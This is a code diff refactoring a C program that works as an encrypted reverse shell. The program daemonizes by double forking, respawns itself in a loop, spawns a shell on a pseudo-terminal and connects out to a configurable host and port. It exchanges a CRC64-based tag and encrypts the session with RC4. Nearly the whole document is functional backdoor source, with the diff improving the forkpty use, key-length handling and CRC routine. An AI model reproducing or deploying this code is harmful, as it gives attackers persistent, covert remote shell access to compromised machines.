@@ -16,6 +16,7 @@
 #ifndef ENCRYPTION_KEY
 #define ENCRYPTION_KEY "CHANGE_ME"
 #endif
+#define ENCRYPTION_KEY_LEN (sizeof(ENCRYPTION_KEY) - 1)
 
 #ifndef CONNECT_HOST
 #define CONNECT_HOST "localhost"
@@ -56,13 +57,14 @@
     b = t;                                                                     \
   }
 
+#if DEBUG_PRINT
 #define _TO_STRING_DETAIL(x) #x
 #define _TO_STRING(x) _TO_STRING_DETAIL(x)
-#define PERROR(msg)                                                            \
-  {                                                                            \
-    if (DEBUG_PRINT)                                                           \
-      perror(__FILE__ ":" _TO_STRING(__LINE__) ": " msg);                      \
-  }
+#define PERROR(msg) perror(__FILE__ ":" _TO_STRING(__LINE__) ": " msg);
+#else
+#define PERROR(msg)
+#endif
+
 #define FATAL(msg)                                                             \
   {                                                                            \
     PERROR(msg);                                                               \
@@ -78,20 +80,6 @@
   })
 #define ASSERT_ERROR(func_call) _ERROR_OP(func_call, FATAL)
 #define CHECK_ERROR(func_call) _ERROR_OP(func_call, PERROR)
-
-#define DEBUG_PROCESS_EXIT(status, msg)                                        \
-  do {                                                                         \
-    if (!DEBUG_PRINT)                                                          \
-      break;                                                                   \
-    if (WIFEXITED(status))                                                     \
-      fprintf(stderr, msg "status=%d\n", WEXITSTATUS(status));                 \
-    else if (WIFSIGNALED(status))                                              \
-      fprintf(stderr, msg "signal=%s\n", strsignal(WTERMSIG(status)));         \
-    else                                                                       \
-      fprintf(stderr, msg "unknown status=%d\n", status);                      \
-  } while (0)
-
-#define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL
 
 typedef struct rc4_state {
   uint8_t i;
@@ -129,28 +117,23 @@ uint8_t rc4_next(rc4_state *state) {
   return state->s[(state->s[state->i] + state->s[state->j]) % 256];
 }
 
+#define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL
 /**
  * CRC64 implementation based on CRC64-ECMA-182
  * @param s input string
+ * @param n input string length
  * @return CRC64 hash
  */
-uint64_t crc64(const char *s) {
+uint64_t crc64(const char *s, size_t n) {
   // Initialization value for the CRC (based on CRC64-ECMA)
   uint64_t crc = 0;
-  size_t i, j;
 
   // Process each byte of the string
-  for (i = 0; s[i] != '\0'; i++) {
+  for (size_t i = 0; i < n; i++) {
     crc ^= (uint64_t)(unsigned char)s[i] << 56; // Integrate byte into the CRC
-
     // Process each bit in the byte
-    for (j = 0; j < 8; j++) {
-      if (crc & (1ULL << 63)) {
-        crc = (crc << 1) ^ CRC64_ECMA_182_POLY;
-      } else {
-        crc <<= 1;
-      }
-    }
+    for (int j = 0; j < 8; j++)
+      crc = crc << 1 ^ (crc & (1ULL << 63) ? CRC64_ECMA_182_POLY : 0ULL);
   }
 
   return crc;
@@ -215,76 +198,55 @@ int main() {
   pid_t pid;
 
 #if DAEMONIZE
-  for (int i = 0; i < 2; i++) {
-    pid = ASSERT_ERROR(fork());
-    if (pid > 0)
+  for (int i = 0; i < 2; i++)
+    if ((pid = ASSERT_ERROR(fork())) > 0)
       return 0;
-  }
 #endif
 
   for (;;) {
-    pid = ASSERT_ERROR(fork());
-    if (pid == 0)
+    if ((pid = ASSERT_ERROR(fork())) == 0)
       break;
-
     int status;
     waitpid(pid, &status, 0);
-    DEBUG_PROCESS_EXIT(status, "Daemon child exited ");
+#if DEBUG_PRINT
+    if (WIFEXITED(status))
+      fprintf(stderr, "child process %d exited with status %d\n", pid,
+              WEXITSTATUS(status));
+    else if (WIFSIGNALED(status))
+      fprintf(stderr, "child process %d exited with signal %s\n", pid,
+              strsignal(WTERMSIG(status)));
+#endif
     sleep(1);
   }
 
-  // Create a pty
-  int master, slave;
-  ASSERT_ERROR(openpty(&master, &slave, NULL, NULL, NULL));
-
-  // Fork
-  pid = ASSERT_ERROR(fork());
-  if (pid == 0) {
-    // Child
-    // Close the master side of the pty
-    close(master);
-
-    ASSERT_ERROR(setsid());
-    ASSERT_ERROR(ioctl(slave, TIOCSCTTY, 0));
-
-    ASSERT_ERROR(dup2(slave, STDIN_FILENO));
-    ASSERT_ERROR(dup2(slave, STDOUT_FILENO));
-    ASSERT_ERROR(dup2(slave, STDERR_FILENO));
-
-    // Execute a shell
+  // Create a pty and fork a shell
+  int master;
+  if ((pid = ASSERT_ERROR(forkpty(&master, NULL, NULL, NULL))) == 0)
     return ASSERT_ERROR(execl(SHELL_COMMAND, SHELL_COMMAND, NULL));
-  }
-
-  // Parent
-  // Close the slave side of the pty
-  close(slave);
 
   // Create a socket
   int sockfd = ASSERT_ERROR(connect_to_host(CONNECT_HOST, CONNECT_PORT));
 
-  // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
-  time_t tag_time = time(NULL);
-  char tag_string[sizeof(ENCRYPTION_KEY) + 16];
-  sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);
+  char tag_value[ENCRYPTION_KEY_LEN + sizeof(uint64_t)];
+  memcpy(tag_value, ENCRYPTION_KEY, ENCRYPTION_KEY_LEN);
+  UINT64_TO_BIG_ENDIAN_ARRAY(time(NULL), tag_value + ENCRYPTION_KEY_LEN);
 
-  uint64_t tag = crc64(tag_string);
-  char tag_buf[sizeof(tag)];
-  UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);
+  char tag[sizeof(uint64_t)];
+  UINT64_TO_BIG_ENDIAN_ARRAY(crc64(tag_value, sizeof(tag_value)), tag);
 
   // mangle encryption key to ensure difference every time
-  char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
-  for (size_t i = 0; i < sizeof(ENCRYPTION_KEY); i++)
-    mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];
+  char mangled_encryption_key[ENCRYPTION_KEY_LEN];
+  memcpy(mangled_encryption_key, ENCRYPTION_KEY, ENCRYPTION_KEY_LEN);
+  for (size_t i = 0; i < sizeof(mangled_encryption_key); i++)
+    mangled_encryption_key[i] ^= tag[i % sizeof(tag)];
 
   // Send tag
-  ASSERT_ERROR(send(sockfd, &tag_buf, sizeof(tag_buf), 0));
+  ASSERT_ERROR(send(sockfd, &tag, sizeof(tag), 0));
 
   // Initialize RC4 states
   rc4_state rc4recv, rc4send;
-  rc4_init(&rc4recv, mangled_encryption_key,
-           sizeof(mangled_encryption_key) - 1);
-  rc4_init(&rc4send, mangled_encryption_key,
-           sizeof(mangled_encryption_key) - 1);
+  rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key));
+  rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key));
 
   // Create duplex socket connection by polling
   int fd_max = MAX(sockfd, master);
